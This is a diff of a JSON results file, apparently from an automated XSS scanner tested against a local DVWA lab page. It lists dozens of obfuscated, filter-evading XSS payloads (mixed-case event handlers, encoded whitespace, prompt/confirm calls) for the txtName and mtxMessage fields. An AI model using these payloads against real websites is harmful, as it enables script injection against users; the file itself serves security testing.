@@ -1,108 +1,224 @@
 [
   {
-    "payloads": [
+    "url": "http://127.0.0.1/vulnerabilities/xss_s/",
+    "list_vulnerability": [
       {
-        "payload": "<dETAILS%09OnToGGLE%0d=%0da=prompt,a()%0dx>"
+        "payloads": [
+          {
+            "payload": "<A/+/OnPOINTeReNteR%09=%09a=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<deTAils%09oNpOinTeReNter+=+a=prompt,a()//"
+          },
+          {
+            "payload": "<dETails/+/OnpoinTereNTer%0d=%0d(confirm)()//"
+          },
+          {
+            "payload": "<a%09ONPOinterENtEr%0d=%0da=prompt,a()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<a%0aonpoINTerenter%09=%09a=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<A%0dONPoinTEreNTEr%0d=%0da=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<deTails%09ONpoINtErenTEr%0a=%0aa=prompt,a()%0dx>"
+          },
+          {
+            "payload": "<D3v%0aonMOUseover%0a=%0a(confirm)()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<DetAIlS%09OnToGgle%0d=%0d(confirm)()//"
+          },
+          {
+            "payload": "<HTML/+/oNmoUSEoVER%0d=%0dconfirm()%0dx>"
+          },
+          {
+            "payload": "<D3v/+/oNPoiNtErENTER+=+a=prompt,a()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<d3v%0aONMousEOVeR%0a=%0a(confirm)()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<a/+/OnmOUSEOver%0a=%0a(prompt)``>v3dm0s"
+          },
+          {
+            "payload": "<deTaiLs/+/ONpOinteRenTER%0d=%0d(prompt)``//"
+          },
+          {
+            "payload": "<A%0aOnpointErEnter%09=%09[8].find(confirm)%0dx>v3dm0s"
+          },
+          {
+            "payload": "<HtmL%09ONPoINTEREnTeR%0a=%0a[8].find(confirm)//"
+          }
+        ],
+        "parameter": "txtName"
       },
       {
-        "payload": "<d3V%0dOnMOUsEOVEr%0d=%0dconfirm()%0dx>v3dm0s"
-      },
-      {
-        "payload": "<HTmL%0donMOusEoVer%0d=%0dconfirm()>"
-      },
-      {
-        "payload": "<D3V/+/ONMOUSeoVeR%09=%09[8].find(confirm)>v3dm0s"
-      },
-      {
-        "payload": "<deTaIlS%0doNpoiNTerenter+=+(confirm)()%0dx//"
-      },
-      {
-        "payload": "<DEtaILS%0aonPoiNTeRENtEr%09=%09(confirm)()%0dx>"
-      },
-      {
-        "payload": "<HTMl%0dOnMoUsEOver%09=%09(prompt)``%0dx//"
-      },
-      {
-        "payload": "<htmL/+/OnMoUseOVeR%0d=%0d(prompt)``>"
-      },
-      {
-        "payload": "<hTmL%0dOnMOUseOVER%0d=%0d[8].find(confirm)>"
-      },
-      {
-        "payload": "<HtmL%0aoNPoINtErEntEr+=+[8].find(confirm)>"
-      },
-      {
-        "payload": "<D3v%0aOnpoinTEReNtEr%0d=%0dconfirm()%0dx>v3dm0s"
-      },
-      {
-        "payload": "<HtML%09OnPOiNTeRenTEr%0a=%0a[8].find(confirm)%0dx//"
-      },
-      {
-        "payload": "<hTmL/+/ONPoINTeRENteR%0d=%0d(confirm)()%0dx//"
-      },
-      {
-        "payload": "<A%09oNMoUSEOVER%09=%09(confirm)()>v3dm0s"
-      },
-      {
-        "payload": "<d3v/+/oNPoinTEREnTER%0d=%0dconfirm()%0dx>v3dm0s"
-      },
-      {
-        "payload": "<DeTAilS/+/onToggLe%0a=%0a(prompt)``%0dx//"
+        "payloads": [
+          {
+            "payload": "<a/+/ONpOiNteReNtEr+=+a=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<DetaILs%09onPoiNtEReNTEr%0a=%0a(prompt)``%0dx>"
+          },
+          {
+            "payload": "<DETAils%0dontoggLe%0a=%0a[8].find(confirm)//"
+          },
+          {
+            "payload": "<a%0aoNmouSEOVer+=+(confirm)()>v3dm0s"
+          },
+          {
+            "payload": "<dETAilS%09OntOGglE%0a=%0aconfirm()>"
+          },
+          {
+            "payload": "<a%09ONMousEoVEr+=+confirm()>v3dm0s"
+          },
+          {
+            "payload": "<d3V%0aONmOUSeOVer%0d=%0dconfirm()>v3dm0s"
+          },
+          {
+            "payload": "<A%09OnmOUSEOvEr+=+(confirm)()>v3dm0s"
+          },
+          {
+            "payload": "<dETAiLS/+/ONtoggLE%0a=%0a(prompt)``//"
+          },
+          {
+            "payload": "<A%0aONmOuSEOvER+=+[8].find(confirm)%0dx>v3dm0s"
+          },
+          {
+            "payload": "<HTML%0aonPoIntERENtEr%09=%09confirm()%0dx//"
+          },
+          {
+            "payload": "<a%09oNmouSEoVer%09=%09a=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<dEtAiLs%0aonpoiNteRENteR%09=%09confirm()%0dx//"
+          },
+          {
+            "payload": "<d3V%09oNpOINtEReNTer%09=%09a=prompt,a()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<DeTails%09onTOgGLE%09=%09a=prompt,a()>"
+          },
+          {
+            "payload": "<deTaiLs%0aOnTOgGlE%0a=%0aa=prompt,a()%0dx//"
+          }
+        ],
+        "parameter": "mtxMessage"
       }
-    ],
-    "parameter": "txtName"
+    ]
   },
   {
-    "payloads": [
+    "url": "http://127.0.0.1/vulnerabilities/xss_s/",
+    "list_vulnerability": [
       {
-        "payload": "<A%0dONMousEOVer%0d=%0d(confirm)()%0dx>v3dm0s"
+        "payloads": [
+          {
+            "payload": "<D3v%0aoNMouseOVEr%09=%09a=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<hTml%09ONPOiNterEnTer+=+a=prompt,a()>"
+          },
+          {
+            "payload": "<A%0dONpoinTerENTEr+=+[8].find(confirm)%0dx>v3dm0s"
+          },
+          {
+            "payload": "<D3V%0dONpOiNtERENTeR%0a=%0aa=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<HTml%09OnpoInTeREnTeR%0a=%0aa=prompt,a()%0dx>"
+          },
+          {
+            "payload": "<detailS/+/OnPOInTeRenTeR%0a=%0a(prompt)``%0dx>"
+          },
+          {
+            "payload": "<D3v%0dOnpOINtEREnteR%09=%09(confirm)()>v3dm0s"
+          },
+          {
+            "payload": "<HTML%0aoNpOInteReNTer%09=%09(prompt)``%0dx//"
+          },
+          {
+            "payload": "<DetAILS%09OnTOggle%0d=%0d[8].find(confirm)//"
+          },
+          {
+            "payload": "<hTML%0aOnpoINTeReNtEr%09=%09confirm()%0dx>"
+          },
+          {
+            "payload": "<HTMl%0dOnPoINTEReNter%09=%09confirm()>"
+          },
+          {
+            "payload": "<hTmL%0aoNPOINTeRenTeR+=+confirm()%0dx//"
+          },
+          {
+            "payload": "<a%0aONPOINtereNteR%0a=%0a(confirm)()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<dETaILS%09ONpoiNTerEnTer%0a=%0aconfirm()>"
+          },
+          {
+            "payload": "<hTml%0aoNMOuseOVER%0d=%0dconfirm()%0dx>"
+          },
+          {
+            "payload": "<detaIls%0dOnTOgGlE%0a=%0a(prompt)``>"
+          }
+        ],
+        "parameter": "txtName"
       },
       {
-        "payload": "<D3V%0aoNMOUseoVEr+=+(confirm)()>v3dm0s"
-      },
-      {
-        "payload": "<dETAIlS%0aOnPOinTereNTEr%09=%09[8].find(confirm)//"
-      },
-      {
-        "payload": "<d3v/+/oNpOInTeRENTeR%09=%09a=prompt,a()%0dx>v3dm0s"
-      },
-      {
-        "payload": "<A%0donpoINTErENTER%0d=%0d[8].find(confirm)>v3dm0s"
-      },
-      {
-        "payload": "<D3v/+/oNPoInTEReNTER%0a=%0a(confirm)()%0dx>v3dm0s"
-      },
-      {
-        "payload": "<DEtAILs/+/OnPoiNtERENter%0d=%0da=prompt,a()>"
-      },
-      {
-        "payload": "<a%0aONmoUSEoveR%0a=%0aa=prompt,a()>v3dm0s"
-      },
-      {
-        "payload": "<HTMl%09ONMOUseoVEr%09=%09(confirm)()//"
-      },
-      {
-        "payload": "<D3v%09OnmoUSeOver%09=%09(confirm)()%0dx>v3dm0s"
-      },
-      {
-        "payload": "<dETaIls%0aoNPOIntErEnter%0a=%0a(prompt)``>"
-      },
-      {
-        "payload": "<Html%0aOnpOInTerENter+=+(confirm)()>"
-      },
-      {
-        "payload": "<html/+/oNMoUsEoVER+=+(confirm)()>"
-      },
-      {
-        "payload": "<htmL%0aoNMOuSEovEr+=+a=prompt,a()%0dx//"
-      },
-      {
-        "payload": "<HTMl%0dONMousEOVEr+=+confirm()%0dx>"
-      },
-      {
-        "payload": "<HTML%0aONmouSeOVer%0a=%0aa=prompt,a()%0dx//"
+        "payloads": [
+          {
+            "payload": "<HtmL%0aonPoINTeRenteR%0a=%0aconfirm()%0dx>"
+          },
+          {
+            "payload": "<html/+/ONmouSEOVEr+=+confirm()>"
+          },
+          {
+            "payload": "<DETAilS%0aonTogGLe%0a=%0aconfirm()//"
+          },
+          {
+            "payload": "<a%0aONpOINTeRENTEr%09=%09[8].find(confirm)>v3dm0s"
+          },
+          {
+            "payload": "<dETAiLs%0aoNpoInTErEnTeR%09=%09a=prompt,a()%0dx//"
+          },
+          {
+            "payload": "<DEtAILS/+/OnPoiNTEREntEr%0d=%0dconfirm()%0dx//"
+          },
+          {
+            "payload": "<d3v/+/oNMOuSEoveR%0a=%0aconfirm()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<d3v%0doNpOIntErEnteR%0a=%0aconfirm()%0dx>v3dm0s"
+          },
+          {
+            "payload": "<deTAILS%0aOnPOintEreNteR%0a=%0a[8].find(confirm)//"
+          },
+          {
+            "payload": "<a%0aONMOuSeOVeR%09=%09confirm()>v3dm0s"
+          },
+          {
+            "payload": "<D3v%09onmouSeOVER+=+confirm()>v3dm0s"
+          },
+          {
+            "payload": "<A%0dOnpoINterEnTeR+=+a=prompt,a()>v3dm0s"
+          },
+          {
+            "payload": "<dETAiLs/+/oNToGGLe+=+(confirm)()//"
+          },
+          {
+            "payload": "<d3v%09oNMOUSEovER%0a=%0a(prompt)``>v3dm0s"
+          },
+          {
+            "payload": "<d3v%0aonpoiNTErENter%0d=%0d(prompt)``%0dx>v3dm0s"
+          },
+          {
+            "payload": "<a%0dOnpoIntereNTer%0a=%0a(confirm)()>v3dm0s"
+          }
+        ],
+        "parameter": "mtxMessage"
       }
-    ],
-    "parameter": "mtxMessage"
+    ]
   }
 ]
